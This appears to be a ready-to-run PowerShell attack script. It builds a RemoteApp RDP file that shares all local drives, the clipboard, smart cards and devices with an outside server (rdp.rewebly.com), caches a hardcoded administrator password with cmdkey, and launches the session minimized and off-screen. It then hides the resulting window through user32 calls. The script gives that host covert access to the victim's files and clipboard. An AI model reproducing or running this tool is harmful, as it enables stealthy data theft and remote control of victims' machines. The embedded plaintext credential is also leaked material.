# --- CONFIGURATION ---
$server   = "rdp.rewebly.com"
$username = "corp\Administrator"
$password = "!Mamoute901901a"

# --- RDP FILE CONTENT ---
$rdpContent = @"
redirectclipboard:i:1
redirectprinters:i:1
redirectcomports:i:1
redirectsmartcards:i:1
devicestoredirect:s:*
drivestoredirect:s:*
redirectdrives:i:1
session bpp:i:32
prompt for credentials on client:i:1
span monitors:i:0
use multimon:i:0
remoteapplicationmode:i:1
server port:i:3389
allow font smoothing:i:1
promptcredentialonce:i:0
videoplaybackmode:i:1
audiocapturemode:i:1
gatewayusagemethod:i:0
gatewayprofileusagemethod:i:1
gatewaycredentialssource:i:0
full address:s:$server
alternate shell:s:||PowerShell_ISE
remoteapplicationprogram:s:||PowerShell_ISE
remoteapplicationname:s:Windows PowerShell ISE (x86)
remoteapplicationcmdline:s:
workspace id:s:$server
use redirection server name:i:1
loadbalanceinfo:s:tsv://MS Terminal Services Plugin.1.DefaultCollectio
alternate full address:s:$server

screen mode id:i:1
displayconnectionbar:i:0
desktopwidth:i:200
desktopheight:i:150
winposstr:s:0,3,-32000,-32000,-31800,-31800

signscope:s:Full Address,Alternate Full Address,Use Redirection Server Name,Server Port,GatewayUsageMethod,GatewayProfileUsageMethod,GatewayCredentialsSource,PromptCredentialOnce,Alternate Shell,RemoteApplicationProgram,RemoteApplicationMode,RemoteApplicationName,RemoteApplicationCmdLine,RedirectDrives,RedirectPrinters,RedirectCOMPorts,RedirectSmartCards,RedirectClipboard,DevicesToRedirect,DrivesToRedirect,LoadBalanceInfo
username:s:$username
"@

# --- Save temp RDP file ---
$tempRdpPath = "$env:TEMP\remoteapp_powershell.rdp"
$rdpContent | Out-File -FilePath $tempRdpPath -Encoding ASCII

# --- Cache credentials ---
cmdkey /generic:$server /user:$username /pass:$password | Out-Null

# --- Launch RemoteApp minimized ---
Start-Process "mstsc.exe" -ArgumentList $tempRdpPath -WindowStyle Minimized

Write-Host "RemoteApp session launching for $username@$server ..."

# --- Now wait until the RemoteApp window appears and hide it ---
powershell -Command @"
Add-Type 'using System;
using System.Runtime.InteropServices;
public class W{
    [DllImport(""user32.dll"")]
    public static extern IntPtr FindWindow(string cls,string win);
    [DllImport(""user32.dll"")]
    public static extern bool ShowWindow(IntPtr h,int cmd);
}';

# Target RemoteApp title
$targetTitle = 'Administrator: Windows PowerShell ISE (x86)'

Write-Host 'Waiting for RemoteApp window...'
while($true){
    $h=[W]::FindWindow($null,$targetTitle)
    if($h -ne [IntPtr]::Zero){
        Write-Host 'Found window, hiding it now...'
        [W]::ShowWindow($h,0) | Out-Null
        break
    }
    Start-Sleep -Milliseconds 500
}
"@
